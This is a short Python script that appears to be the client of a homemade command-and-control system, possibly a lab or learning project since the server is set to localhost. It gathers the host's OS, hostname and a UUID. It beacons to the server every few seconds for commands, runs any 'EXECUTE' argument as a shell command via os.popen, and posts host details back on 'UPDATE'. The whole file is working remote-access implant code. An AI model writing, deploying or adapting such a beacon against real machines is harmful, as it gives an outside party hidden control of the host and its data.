#!/usr/bin/env python3

import os.path
import socket
from datetime import datetime
import time
import random
import uuid
from platform import node
import requests
import json

SERVER_IP = "localhost"
SERVER_PORT = 8000
BUFFER_SIZE = 2048
OS = os.popen("lsb_release -d | cut -d ':' -f2").read().strip()
UUID = uuid.uuid1()
HOSTNAME = node().strip()
MAX_FAILS = 10
failCount = 0

def connectToServer(ip, port):
    print("Connecting to server")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    return s

def sendData(socket, data):
    print("Sending Data")
    socket.sendall(data.encode())
    print("SENT")

def closeSocket(socket):
    print("Closing Socket")
    socket.close()

def beacon():
    r = requests.get(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/client/" + str(UUID) + "/commands"))
    return r.text

def httpPost():
    data = {'UUID':UUID,
            'OS':OS,
            'HOSTNAME':HOSTNAME}
    r = requests.post(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/update"), data = data)


if __name__ == "__main__":
    print("Starting client")
    while failCount < MAX_FAILS:
        try:
            data = ""
            data =  beacon()
            print("BEACONED")
            failCount = 0
            time.sleep(5)
        except:
            failCount += 1
            print("FAILS: " + str(failCount))
        if data != "{}" and data:
            print(data)
            serverText = json.loads(data)
            print(serverText["command"])
            print(serverText["args"])
            if serverText["command"] == "EXECUTE":
                print(os.popen(serverText["args"]).read())
            elif serverText["command"] == "UPDATE":
                httpPost()
        time.sleep(random.randint(1,10))
